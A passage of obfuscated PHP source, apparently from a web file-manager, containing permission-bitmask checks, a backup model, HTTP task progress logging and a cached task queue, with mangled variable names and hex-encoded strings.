LNG($ÇÄÑŠùç[1870]), $ÇÄÑŠùç[1861] => $ÇÄÑŠùç[1871], $ÇÄÑŠùç[1863] => 4, $ÇÄÑŠùç[1864] => 1, $ÇÄÑŠùç[1865] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÇÄÑŠùç[458] => LNG($ÇÄÑŠùç[1872]), $ÇÄÑŠùç[1861] => $ÇÄÑŠùç[1873], $ÇÄÑŠùç[1863] => 5, $ÇÄÑŠùç[1864] => 1, $ÇÄÑŠùç[1865] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÇÄÑŠùç[458] => LNG($ÇÄÑŠùç[1874]), $ÇÄÑŠùç[1861] => $ÇÄÑŠùç[1875], $ÇÄÑŠùç[1863] => 6, $ÇÄÑŠùç[1864] => 1, $ÇÄÑŠùç[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÇÄÑŠùç[458] => LNG($ÇÄÑŠùç[1876]), $ÇÄÑŠùç[1861] => $ÇÄÑŠùç[1877], $ÇÄÑŠùç[1863] => 7, $ÇÄÑŠùç[1864] => 1, $ÇÄÑŠùç[1865] => 0)); return $±°Ì“Œá; } public static function authCheck($í‘¿””, $”òã­¸ğ) { $§”íåì =& $_SERVER[¹òÍ›æş]; $í‘¿”” = intval($í‘¿””); if ($GLOBALS[$§”íåì[532]] && $GLOBALS[$§”íåì[6]][$§”íåì[1878]]) { return !0; } if ($í‘¿”” <= 0) { return !1; } if (($í‘¿”” & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($í‘¿”” & $”òã­¸ğ); } public static function authCheckShow($¥¬Ò˜ÎÆ) { return self::authCheck($¥¬Ò˜ÎÆ, self::AUTH_SHOW); } public static function authCheckView($ñ•ÑÕµ³) { return self::authCheck($ñ•ÑÕµ³, self::AUTH_VIEW); } public static function authCheckDownload($êæÇÌê´) { return self::authCheck($êæÇÌê´, self::AUTH_DOWNLOAD); } public static function authCheckUpload($–î®œ¼) { return self::authCheck($–î®œ¼, self::AUTH_UPLOAD); } public static function authCheckEdit($ÉŒµÍâ) { return self::authCheck($ÉŒµÍâ, self::AUTH_EDIT); } public static function authCheckRemove($ˆ¿È‰Ñ®) { return self::authCheck($ˆ¿È‰Ñ®, self::AUTH_REMOVE); } public static function authCheckShare($èÃÆüë) { return self::authCheck($èÃÆüë, self::AUTH_SHARE); } public static function authCheckComment($†Ñ±£¼) { return self::authCheck($†Ñ±£¼, self::AUTH_COMMENT); } public static function authCheckEvent($Ó÷Ñ’Œ‘) { return self::authCheck($Ó÷Ñ’Œ‘, self::AUTH_EVENT); } public static function authCheckRoot($¥÷úáÜ) { return self::authCheck($¥÷úáÜ, self::AUTH_ROOT); } public static function authCheckAction($È˜©˜ºş, $±€Š´) { $ê®êâ¬œ =& $_SERVER[¹òÍ›æş]; $Êı„—Ù… = array($ê®êâ¬œ[1879] => self::AUTH_VIEW, $ê®êâ¬œ[1221] => self::AUTH_DOWNLOAD, $ê®êâ¬œ[117] => self::AUTH_UPLOAD, $ê®êâ¬œ[1829] => self::AUTH_EDIT, $ê®êâ¬œ[1828] => self::AUTH_REMOVE, $ê®êâ¬œ[1839] => self::AUTH_SHARE, $ê®êâ¬œ[392] => self::AUTH_COMMENT, $ê®êâ¬œ[1657] => self::AUTH_EVENT, $ê®êâ¬œ[1880] => self::AUTH_ROOT); if (!isset($Êı„—Ù…[$±€Š´])) { return; } $°–Ÿó² = $Êı„—Ù…[$±€Š´]; $È˜©˜ºş = intval($È˜©˜ºş); if ($È˜©˜ºş <= 0) { return !1; } if (($È˜©˜ºş & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($È˜©˜ºş & $°–Ÿó²); } public static function authDisable($‹¹š­¨ø, $Â¯é©±÷) { if (intval($‹¹š­¨ø) <= 0) { return 0; } return intval($‹¹š­¨ø) & ~$Â¯é©±÷; } public $optionType = "\123\x79\163\x74\x65\155\x2e\163\x6f\x75\162\x63\145\101\165\x74\150\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\x75\x74\x68", "\x6c\141\142\x65\x6c", "\x64\151\163\160\x6c\141\171", "\163\x79\163\x74\145\x6d", "\163\157\x72\x74"); public function initData() { $ãŠ’ù» = $this->authDefault(); foreach ($ãŠ’ù» as $ÄÖ£ì…ç) { $this->add($ÄÖ£ì…ç); } } public function findAuth($¾Øğò„È, $¼¥õÃ‡²) { $º‰À“— =& $_SERVER[¹òÍ›æş]; $Š¿â³ = parent::listData(); foreach ($Š¿â³ as $«İ†õ½ë) { $‹Ä€Ğ´ı = intval($«İ†õ½ë[$º‰À“—[451]]); if ($‹Ä€Ğ´ı <= 0 || $«İ†õ½ë[$º‰À“—[1881]] == 0) { continue; } if (($‹Ä€Ğ´ı & $¾Øğò„È) != $¾Øğò„È) { continue; } if (($‹Ä€Ğ´ı & $¼¥õÃ‡²) != 0) { continue; } return $«İ†õ½ë[$º‰À“—[437]]; } return !1; } public function findAuthReadOnly() { $ÛœŒ¬¬ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ã²×ñ…ö = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ÛœŒ¬¬, $ã²×ñ…ö); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÄšúÕş¦ =& $_SERVER[¹òÍ›æş]; $„‚ÒŞš‘ = parent::listData(); $“çñ×È = !1; foreach ($„‚ÒŞš‘ as $ùÑÒú¿ƒ) { if ($ùÑÒú¿ƒ[$ÄšúÕş¦[451]] <= 0 || $ùÑÒú¿ƒ[$ÄšúÕş¦[1881]] == $ÄšúÕş¦[208]) { continue; } if (!$“çñ×È) { $“çñ×È = $ùÑÒú¿ƒ; continue; } if ($“çñ×È[$ÄšúÕş¦[451]] > $ùÑÒú¿ƒ[$ÄšúÕş¦[451]]) { $“çñ×È = $ùÑÒú¿ƒ; } } return $“çñ×È ? $“çñ×È[$ÄšúÕş¦[437]] : $ÄšúÕş¦[12]; } public function listData($„µ÷¶Ší = false, $€çöıÀı = "\163\157\162\x74", $ó®Èä´­ = false) { return parent::listData($„µ÷¶Ší, $€çöıÀı, $ó®Èä´­); } public function update($ÒÛ¼Ğº, $¿È½ëïÎ) { $¸€ğüÎŒ =& $_SERVER[¹òÍ›æş]; $©Ñıå = parent::listData($ÒÛ¼Ğº); $µúµ¦…» = $this->findByName($¿È½ëïÎ[$¸€ğüÎŒ[32]]); if (!$©Ñıå || $µúµ¦…» && $µúµ¦…»[$¸€ğüÎŒ[437]] != $©Ñıå[$¸€ğüÎŒ[437]]) { return !1; } $this->filterAuth($¿È½ëïÎ[$¸€ğüÎŒ[451]]); return parent::update($ÒÛ¼Ğº, $¿È½ëïÎ); } public function remove($ÄÀŸ™ğ¥) { $¢¿Ãà¸ = parent::listData($ÄÀŸ™ğ¥); if (!$¢¿Ãà¸ || $¢¿Ãà¸[$_SERVER[¹òÍ›æş][1314]]) { return !1; } return parent::remove($ÄÀŸ™ğ¥); } public function add($ùîšß¾º = array()) { $‚óâû¥¶ =& $_SERVER[¹òÍ›æş]; if ($this->findByName($ùîšß¾º[$‚óâû¥¶[32]])) { return !1; } $ ‚Í÷Ñ = array($‚óâû¥¶[32] => $‚óâû¥¶[12], $‚óâû¥¶[451] => 1, $‚óâû¥¶[1882] => $‚óâû¥¶[1869], $‚óâû¥¶[1881] => 1, $‚óâû¥¶[1314] => 0, $‚óâû¥¶[1883] => 0); $ùîšß¾º = array_merge($ ‚Í÷Ñ, $ùîšß¾º); $ùîšß¾º[$‚óâû¥¶[1883]] = $this->getSort(); $this->filterAuth($ùîšß¾º[$‚óâû¥¶[451]]); return parent::insert($ùîšß¾º); } private function getSort() { $ÔÌªŒ–Ô =& $_SERVER[¹òÍ›æş]; $¼ûÃ‚Ô­ = parent::listData(); $å¼âÁóò = array_to_keyvalue($¼ûÃ‚Ô­, $ÔÌªŒ–Ô[12], $ÔÌªŒ–Ô[1883]); return empty($å¼âÁóò) ? 0 : max($å¼âÁóò) + 1; } private function filterAuth(&$±ïŞÓñ£) { if (!$±ïŞÓñ£) { return; } $úªÌª¬† = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ùì·æíº = array(); foreach ($úªÌª¬† as $°²¡çÌ) { if ($±ïŞÓñ£ & $°²¡çÌ) { $ùì·æíº[] = $°²¡çÌ; } } if (in_array(self::AUTH_ROOT, $ùì·æíº)) { $±ïŞÓñ£ = array_sum($úªÌª¬†); return; } $Ôïú¾†œ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ùì·æíº as $°²¡çÌ) { if (isset($Ôïú¾†œ[$°²¡çÌ])) { $ùì·æíº = array_merge($ùì·æíº, $Ôïú¾†œ[$°²¡çÌ]); } } $ùì·æíº[] = self::AUTH_SHOW; $±ïŞÓñ£ = array_sum(array_unique($ùì·æíº)); } public function sort($µ‰ı”Œõ, $×§Ãœê·) { return parent::update($µ‰ı”Œõ, $×§Ãœê·); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\x62\x61\143\153\x75\160\114\151\163\164"; public $field = array("\x69\x6f", "\x6e\x61\x6d\x65", "\x73\x74\141\164\x75\163", "\x63\x6f\x6e\x74\145\x6e\164", "\155\141\x6e\165\x61\154", "\162\145\163\x75\x6c\x74", "\x74\x69\155\x65\106\x72\x6f\155", "\x74\151\155\145\x54\x6f"); public function config() { $°§©ôÒÏ =& $_SERVER[¹òÍ›æş]; $ÈîÏ­¿’ = Model($°§©ôÒÏ[800])->get($°§©ôÒÏ[810]); $ÈîÏ­¿’ = json_decode($ÈîÏ­¿’, !0); $ÈîÏ­¿’ = is_array($ÈîÏ­¿’) ? $ÈîÏ­¿’ : array(); if (!isset($ÈîÏ­¿’[$°§©ôÒÏ[784]])) { $ÈîÏ­¿’[$°§©ôÒÏ[784]] = $°§©ôÒÏ[98]; } unset($ÈîÏ­¿’[$°§©ôÒÏ[1639]]); Action($°§©ôÒÏ[1884])->taskInit(); Model($°§©ôÒÏ[1638])->cacheClear(); $°¸¼Ò‚å = $°§©ôÒÏ[1885]; $†ô— ª = Model($°§©ôÒÏ[1886])->findByKey($°§©ôÒÏ[1657], $°¸¼Ò‚å); if (!$†ô— ª) { $†ô— ª = array(); } if (isset($†ô— ª[$°§©ôÒÏ[190]])) { $†ô— ª[$°§©ôÒÏ[190]] = json_decode($†ô— ª[$°§©ôÒÏ[190]], !0); } if (isset($ÈîÏ­¿’[$°§©ôÒÏ[190]])) { $†ô— ª[$°§©ôÒÏ[190]][$°§©ôÒÏ[1642]] = $ÈîÏ­¿’[$°§©ôÒÏ[190]]; unset($ÈîÏ­¿’[$°§©ôÒÏ[190]]); } return array_merge($†ô— ª, $ÈîÏ­¿’); } public function listData($¥æÄª€¨ = false, $„ ò‡ÖÓ = "\155\x6f\144\x69\146\171\124\x69\x6d\x65", $úğÕ¶Á = false) { return parent::listData($¥æÄª€¨, $„ ò‡ÖÓ, !0); } public function lastItem() { $Ù•÷ŠÂ¶ = $this->listData(); return !empty($Ù•÷ŠÂ¶[0]) ? $Ù•÷ŠÂ¶[0] : null; } public function kill($İ†§÷) { $ÊÁ›ŸãÄ =& $_SERVER[¹òÍ›æş]; $”èÎÄ‘ = $this->listData($İ†§÷); if (!$”èÎÄ‘ || empty($”èÎÄ‘[$ÊÁ›ŸãÄ[32]])) { return !0; } Task::kill($ÊÁ›ŸãÄ[809]); Task::kill($ÊÁ›ŸãÄ[830]); Task::kill($ÊÁ›ŸãÄ[839]); $ßÎˆµ ¨ = $”èÎÄ‘[$ÊÁ›ŸãÄ[32]]; $‡ıŠÄ¡“ = TEMP_FILES . $ÊÁ›ŸãÄ[808] . $ßÎˆµ ¨ . $ÊÁ›ŸãÄ[8]; IO::remove($‡ıŠÄ¡“, !1); return $this->remove($İ†§÷); } public function remove($èü×Ã›Å) { $ìÃÂ¿×æ = $this->listData($èü×Ã›Å); if (!$ìÃÂ¿×æ) { return !0; } return $this->backupRemove($ìÃÂ¿×æ); } private function backupRemove($Š¯üéç‰) { parent::remove($Š¯üéç‰[$_SERVER[¹òÍ›æş][437]]); $¸¡ğ“ = $this->backupPath($Š¯üéç‰); IO::remove($¸¡ğ“, !1); return !0; } private function backupPath($ËŸ¹Ğóû) { $êê³ß¶Ä =& $_SERVER[¹òÍ›æş]; $ĞìÏúüİ = $ËŸ¹Ğóû[$êê³ß¶Ä[32]]; $¢Ùé¤´ë = Model($êê³ß¶Ä[800])->get($êê³ß¶Ä[801]); $ı°ƒ³‘ = substr(md5($êê³ß¶Ä[802] . $¢Ùé¤´ë . $ĞìÏúüİ), 0, 8); return "\173\151\157\72{$ËŸ¹Ğóû[$êê³ß¶Ä[781]]}\x7d\x2f\144\141\x74\x61\x62\141\163\145\57\x62\141\x63\153\165\x70\x2f" . $ĞìÏúüİ . $êê³ß¶Ä[11] . $ı°ƒ³‘; } public function start() { $™†˜ş¤„ =& $_SERVER[¹òÍ›æş]; if ($GLOBALS[$™†˜ş¤„[6]][$™†˜ş¤„[99]][$™†˜ş¤„[1887]] != $™†˜ş¤„[98]) { return !0; } $üÅ„…ûÒ = $this->config(); if (!$üÅ„…ûÒ || $üÅ„…ûÒ[$™†˜ş¤„[1639]] != $™†˜ş¤„[98]) { return !1; } $ŞÛ¥Ã = $this->process(); foreach ($ŞÛ¥Ã as $í–†»óú) { if ($í–†»óú) { return Task::restart($í–†»óú[$™†˜ş¤„[437]]); } } $¬¡‚¿ » = new Backup(); $š´û¥¾ = $¬¡‚¿ »->db(); if ($š´û¥¾) { $š´û¥¾ = $¬¡‚¿ »->dbFile(); if ($š´û¥¾ && $üÅ„…ûÒ[$™†˜ş¤„[784]] == $™†˜ş¤„[208]) { $š´û¥¾ = $¬¡‚¿ »->file(); } } Backup::set(array($™†˜ş¤„[780] => 1, $™†˜ş¤„[791] => time())); return !0; } public function process() { $œ¹šäÌ =& $_SERVER[¹òÍ›æş]; $ºúÌç·Ó = array($œ¹šäÌ[787] => Task::get($œ¹šäÌ[809]), $œ¹šäÌ[792] => Task::get($œ¹šäÌ[830]), $œ¹šäÌ[210] => Task::get($œ¹šäÌ[839])); $œÖÇù½ = !1; foreach ($ºúÌç·Ó as &$«¼âÍ®à) { if ($œÖÇù½) { $«¼âÍ®à = !1; continue; } if ($«¼âÍ®à) { $„´‚®ô¬ = intval(_get($«¼âÍ®à, $œ¹šäÌ[1674], 0)); if (time() - $„´‚®ô¬ > 7200) { Task::kill($«¼âÍ®à[$œ¹šäÌ[437]]); $œÖÇù½ = !0; $«¼âÍ®à = !1; } } } return $ºúÌç·Ó; } public function restore() { $×Œ¾¨æ¿ =& $_SERVER[¹òÍ›æş]; ActionCall($×Œ¾¨æ¿[1087], !0, 1); ActionCall($×Œ¾¨æ¿[1087], !0, 0); } } goto bÅôç­„†Ú; Cƒ¢Ë¶´·Ö: class TaskHttp extends Task { protected function startAfter() { $•°©¹ÖŞ =& $_SERVER[¹òÍ›æş]; $šÈÀ¸ëÜ =& $this->task; $šÈÀ¸ëÜ[$•°©¹ÖŞ[1746]] = 1; Hook::bind($•°©¹ÖŞ[1714], array($this, $•°©¹ÖŞ[1747])); Hook::bind($•°©¹ÖŞ[1716], array($this, $•°©¹ÖŞ[1748])); Hook::bind($•°©¹ÖŞ[1718], array($this, $•°©¹ÖŞ[1749])); } protected function endAfter() { $§ ›Ó–» =& $_SERVER[¹òÍ›æş]; Hook::unbind($§ ›Ó–»[1714], array($this, $§ ›Ó–»[1747])); Hook::unbind($§ ›Ó–»[1716], array($this, $§ ›Ó–»[1748])); Hook::unbind($§ ›Ó–»[1718], array($this, $§ ›Ó–»[1749])); } public function progressStart($÷ØŸœËå) { $Ö¦×¥í =& $_SERVER[¹òÍ›æş]; $ŒÄØ¬¨ = curl_getinfo($÷ØŸœËå); self::log($Ö¦×¥í[1750] . $ŒÄØ¬¨[$Ö¦×¥í[345]]); self::valueSet($this->task[$Ö¦×¥í[437]], $this->task); } public function progressEnd($ƒğøéÃÔ) { $ÁÔÛ³”´ =& $_SERVER[¹òÍ›æş]; self::log($ÁÔÛ³”´[1751] . $this->task[$ÁÔÛ³”´[437]]); $this->end(); } public function progress($¼»Û´ä, $ô‹Š§ëÖ, $ÛøÚ“õÚ, $Ç¯áİõÛ, $„æŒ²‡ğ) { $õ„â =& $_SERVER[¹òÍ›æş]; $¬¡ˆ•øİ =& $this->task; if ($„æŒ²‡ğ > 0) { $¬¡ˆ•øİ[$õ„â[816]] = $¬¡ˆ•øİ[$õ„â[816]] == 0 ? $Ç¯áİõÛ : $¬¡ˆ•øİ[$õ„â[816]]; $¬¡ˆ•øİ[$õ„â[1670]] = $„æŒ²‡ğ; } else { if ($ÛøÚ“õÚ > 0) { $¬¡ˆ•øİ[$õ„â[816]] = $¬¡ˆ•øİ[$õ„â[816]] == 0 ? $ô‹Š§ëÖ : $¬¡ˆ•øİ[$õ„â[816]]; $¬¡ˆ•øİ[$õ„â[1670]] = $ÛøÚ“õÚ; } } $this->update(); self::log("\x70\162\157\147\162\145\163\163\110\x74\164\160\x3a\x64\x6f\167\x6e\x3a{$ÛøÚ“õÚ}\57{$ô‹Š§ëÖ}\x3b\x20\165\160\x6c\x6f\x61\144\72{$„æŒ²‡ğ}\x2f{$Ç¯áİõÛ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($µÚÛš¹…, $ÁÃ×¨£× = '', $—Œ£¸üÓ = 0, $ÚÅ¢—ß™ = '') { $Œ¨ˆæû¢ =& $_SERVER[¹òÍ›æş]; $©¯Õûé = new Task($µÚÛš¹…, $ÁÃ×¨£×, $—Œ£¸üÓ, $ÚÅ¢—ß™); $GLOBALS[$Œ¨ˆæû¢[1752] . $µÚÛš¹…] = new TaskLog($Œ¨ˆæû¢[1653], $©¯Õûé, $ÚÅ¢—ß™); return $©¯Õûé; } public function __construct($òÌ—ÏÙ = '', $Ëˆ“ß— = '', $áé‡¨‚ç = '') { $†£€¤îù =& $_SERVER[¹òÍ›æş]; if (!$òÌ—ÏÙ) { $òÌ—ÏÙ = $†£€¤îù[1653]; } $Â›„˜Íá = $òÌ—ÏÙ . $†£€¤îù[424] . rand_string(10); if (!$áé‡¨‚ç) { $áé‡¨‚ç = $òÌ—ÏÙ . $†£€¤îù[53] . $áé‡¨‚ç; } switch ($òÌ—ÏÙ) { case $†£€¤îù[1653]: if (!$Ëˆ“ß— || !$Ëˆ“ß—->task) { return echoLog($òÌ—ÏÙ . $†£€¤îù[1753]); } $œ‚ºìëü = $Ëˆ“ß—; $Â›„˜Íá = $œ‚ºìëü->task[$†£€¤îù[437]]; $òÌ—ÏÙ = $œ‚ºìëü->task[$†£€¤îù[437]]; if (!$œ‚ºìëü->task[$†£€¤îù[1569]]) { $œ‚ºìëü->task[$†£€¤îù[1569]] = $áé‡¨‚ç ? $áé‡¨‚ç : $òÌ—ÏÙ; } break; case $†£€¤îù[1754]: if (!$Ëˆ“ß—) { return echoLog($òÌ—ÏÙ . $†£€¤îù[1755]); } $•¯‹ÃÎ = is_string($Ëˆ“ß—) ? array($Ëˆ“ß—) : $Ëˆ“ß—; $œ‚ºìëü = new TaskFileTransfer($Â›„˜Íá, $òÌ—ÏÙ, 0, $áé‡¨‚ç ? $áé‡¨‚ç : $•¯‹ÃÎ[0]); foreach ($•¯‹ÃÎ as $»ø°ßñ½) { $œ‚ºìëü->addPath($»ø°ßñ½); } break; case $†£€¤îù[351]: if (!$Ëˆ“ß—) { return echoLog($òÌ—ÏÙ . $†£€¤îù[1755]); } $•¯‹ÃÎ = is_string($Ëˆ“ß—) ? array($Ëˆ“ß—) : $Ëˆ“ß—; $œ‚ºìëü = new TaskZip($Â›„˜Íá, $òÌ—ÏÙ, 0, $áé‡¨‚ç ? $áé‡¨‚ç : $•¯‹ÃÎ[0]); foreach ($•¯‹ÃÎ as $»ø°ßñ½) { $œ‚ºìëü->addPath($»ø°ßñ½); } break; case $†£€¤îù[1241]: if (!$Ëˆ“ß—) { return echoLog($òÌ—ÏÙ . $†£€¤îù[1755]); } $œ‚ºìëü = new TaskUnZip($Â›„˜Íá, $òÌ—ÏÙ, 0, $áé‡¨‚ç ? $áé‡¨‚ç : $Ëˆ“ß—); if ($Ëˆ“ß—) { $œ‚ºìëü->addFile($Ëˆ“ß—); } break; case $†£€¤îù[158]: $œ‚ºìëü = new TaskHttp($Â›„˜Íá, $òÌ—ÏÙ); break; default: return; break; } $this->task = $œ‚ºìëü; $this->taskID = $Â›„˜Íá; Hook::bind($†£€¤îù[1690], array($this, $†£€¤îù[1756])); Hook::bind($†£€¤îù[1692], array($this, $†£€¤îù[1757])); Hook::bind($†£€¤îù[1686], array($this, $†£€¤îù[1758])); echoLog($†£€¤îù[1759] . $œ‚ºìëü->task[$†£€¤îù[1569]]); } public function __destruct() { $this->end(); } public function end($¸®ı¿¬È = '') { $Ü–É»¨‘ =& $_SERVER[¹òÍ›æş]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¸®ı¿¬È); $this->task = !1; $this->taskID = !1; Hook::unbind($Ü–É»¨‘[1690], array($this, $Ü–É»¨‘[1756])); Hook::unbind($Ü–É»¨‘[1692], array($this, $Ü–É»¨‘[1757])); Hook::unbind($Ü–É»¨‘[1686], array($this, $Ü–É»¨‘[1758])); } public function taskUpdate($´‚‚Ş«Û) { $ÂÕˆ¨µè =& $_SERVER[¹òÍ›æş]; if (!$´‚‚Ş«Û || $this->taskID != $´‚‚Ş«Û[$ÂÕˆ¨µè[437]]) { return; } $İâ¬‰Û¤ = 20; $½Ê¨¶í = intval($´‚‚Ş«Û[$ÂÕˆ¨µè[1671]] * $İâ¬‰Û¤); $µ©´¤­Æ = $ÂÕˆ¨µè[172] . str_repeat($ÂÕˆ¨µè[911], $½Ê¨¶í) . $ÂÕˆ¨µè[1041] . str_repeat($ÂÕˆ¨µè[53], $İâ¬‰Û¤ - $½Ê¨¶í) . $ÂÕˆ¨µè[174]; $Ç—‹ÏÇ¹ = $µ©´¤­Æ . sprintf($ÂÕˆ¨µè[1760], $´‚‚Ş«Û[$ÂÕˆ¨µè[1671]] * 100) . $ÂÕˆ¨µè[1761]; $»­¡öçü = $Ç—‹ÏÇ¹ . $´‚‚Ş«Û[$ÂÕˆ¨µè[1670]] . $ÂÕˆ¨µè[8] . $´‚‚Ş«Û[$ÂÕˆ¨µè[816]] . LNG($ÂÕˆ¨µè[1762]); $àõ¼ŒÅó = $ÂÕˆ¨µè[12]; if ($´‚‚Ş«Û[$ÂÕˆ¨µè[1746]]) { $»­¡öçü = $Ç—‹ÏÇ¹ . size_format($´‚‚Ş«Û[$ÂÕˆ¨µè[1670]]) . $ÂÕˆ¨µè[8] . size_format($´‚‚Ş«Û[$ÂÕˆ¨µè[816]]); $àõ¼ŒÅó = size_format($´‚‚Ş«Û[$ÂÕˆ¨µè[1672]]) . $ÂÕˆ¨µè[1763]; } if ($´‚‚Ş«Û[$ÂÕˆ¨µè[1091]]) { $´‚‚Ş«Û[$ÂÕˆ¨µè[1720]] = $´‚‚Ş«Û[$ÂÕˆ¨µè[1091]] . $ÂÕˆ¨µè[53] . $´‚‚Ş«Û[$ÂÕˆ¨µè[1720]]; } if ($´‚‚Ş«Û[$ÂÕˆ¨µè[1720]]) { $«¦Å²×û = $ÂÕˆ¨µè[12]; if ($´‚‚Ş«Û[$ÂÕˆ¨µè[1722]]) { $«¦Å²×û = $ÂÕˆ¨µè[50] . size_format($´‚‚Ş«Û[$ÂÕˆ¨µè[1723]]) . $ÂÕˆ¨µè[8] . size_format($´‚‚Ş«Û[$ÂÕˆ¨µè[1722]]); } $àõ¼ŒÅó .= $´‚‚Ş«Û[$ÂÕˆ¨µè[1720]] . $«¦Å²×û; } if ($´‚‚Ş«Û[$ÂÕˆ¨µè[793]] && !$´‚‚Ş«Û[$ÂÕˆ¨µè[1722]]) { $àõ¼ŒÅó .= $ÂÕˆ¨µè[53] . size_format($´‚‚Ş«Û[$ÂÕˆ¨µè[1727]]) . $ÂÕˆ¨µè[8] . size_format($´‚‚Ş«Û[$ÂÕˆ¨µè[793]]); } echoLog($»­¡öçü . $ÂÕˆ¨µè[53] . $àõ¼ŒÅó, !0); } public function taskEnd($ÕššÂ­) { $ çÁØîÁ =& $_SERVER[¹òÍ›æş]; if (!$ÕššÂ­ || $this->taskID != $ÕššÂ­[$ çÁØîÁ[437]]) { return; } $æ‰—…€“ = $ÕššÂ­ ? $ÕššÂ­[$ çÁØîÁ[1670]] . $ çÁØîÁ[8] . $ÕššÂ­[$ çÁØîÁ[816]] . LNG($ çÁØîÁ[1762]) . $ çÁØîÁ[81] : $ çÁØîÁ[12]; echoLog($ çÁØîÁ[1764] . $ÕššÂ­[$ çÁØîÁ[1569]] . ($ÕššÂ­[$ çÁØîÁ[491]] ? $ çÁØîÁ[81] . $ÕššÂ­[$ çÁØîÁ[491]] : $ çÁØîÁ[12]) . $ çÁØîÁ[81] . $æ‰—…€“ . $ çÁØîÁ[1765] . sprintf($ çÁØîÁ[880], timeFloat() - $ÕššÂ­[$ çÁØîÁ[1673]]) . $ çÁØîÁ[1685]); $this->end(); } public function taskKill($ß¬™Û“–) { $œ³í€êÊ =& $_SERVER[¹òÍ›æş]; if (!$ß¬™Û“– || $this->taskID != $ß¬™Û“–[$œ³í€êÊ[437]]) { return; } echoLog($œ³í€êÊ[1766] . $ß¬™Û“–[$œ³í€êÊ[1569]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\153\x51\165\x65\165\145\114\x65\156\147\164\150"; const QUEUE_DATA = "\164\141\163\153\x51\165\x65\x75\x65\104\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($ã®°ŞˆÃ, $âúİ÷° = array(), $Şˆß¹÷‹ = '', $ ÁÌôÆ = '') { $éËö÷Ïê =& $_SERVER[¹òÍ›æş]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ ÁÌôÆ && array_find_by_field(self::$listData, $éËö÷Ïê[104], $ ÁÌôÆ)) { return !0; } self::$listData[] = array($éËö÷Ïê[302] => $ã®°ŞˆÃ, $éËö÷Ïê[1767] => $âúİ÷°, $éËö÷Ïê[491] => $Şˆß¹÷‹, $éËö÷Ïê[104] => $ ÁÌôÆ); return !0; } public static function addSubmit() { $€şĞª³‘ =& $_SERVER[¹òÍ›æş]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($€şĞª³‘[1768] . json_encode_force(array_to_keyvalue(self::$listData, $€şĞª³‘[12], $€şĞª³‘[491])), $€şĞª³‘[1769]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($”áù­¡‹, $âçå‹²â = array(), $Ó§í­Ê¹ = '', $»·”ªá‰ = '') { $”ƒ¦ˆ­ë =& $_SERVER[¹òÍ›æş]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ùÎĞåĞÛ = self::getAll(); if ($»·”ªá‰ && array_find_by_field($ùÎĞåĞÛ, $”ƒ¦ˆ­ë[104], $»·”ªá‰)) { return !0; } $ùÎĞåĞÛ[] = array($”ƒ¦ˆ­ë[302] => $”áù­¡‹, $”ƒ¦ˆ­ë[1767] => $âçå‹²â, $”ƒ¦ˆ­ë[491] => $Ó§í­Ê¹, $”ƒ¦ˆ­ë[104] => $»·”ªá‰); write_log($”ƒ¦ˆ­ë[1768] . $Ó§í­Ê¹, $”ƒ¦ˆ­ë[1769]); self::setAll($ùÎĞåĞÛ); return !0; } public static function run() { $ÈÚé¹ÊÀ =& $_SERVER[¹òÍ›æş]; $êÒÙğÓÁ = self::getAll(); $äùÇ¸ßÚ = array_shift($êÒÙğÓÁ); if (!$äùÇ¸ßÚ) { return !1; } self::setAll($êÒÙğÓÁ); $Ó›û²Ş = timeFloat(); $ªò«Æ‰‰ = $ÈÚé¹ÊÀ[12]; try { $ªò«Æ‰‰ = Hook::apply($äùÇ¸ßÚ[$ÈÚé¹ÊÀ[302]], $äùÇ¸ßÚ[$ÈÚé¹ÊÀ[1767]]); } catch (Exception $ğ×ê¹¸Ù) { } $ª¾¥—½× = number_format(timeFloat() - $Ó›û²Ş, 3) . $ÈÚé¹ÊÀ[1685]; if ($ªò«Æ‰‰ && is_string($ªò«Æ‰‰)) { $ª¾¥—½× = $ª¾¥—½× . $ÈÚé¹ÊÀ[1770] . $ªò«Æ‰‰; } write_log($ÈÚé¹ÊÀ[1771] . $äùÇ¸ßÚ[$ÈÚé¹ÊÀ[491]] . $ÈÚé¹ÊÀ[1772] . $ª¾¥—½×, $ÈÚé¹ÊÀ[1769]); return !0; } public static function count() { $ô†èïÆÌ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ô†èïÆÌ) { return 0; } return intval($ô†èïÆÌ); } public static function getAll() { $û³Û±œÛ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if 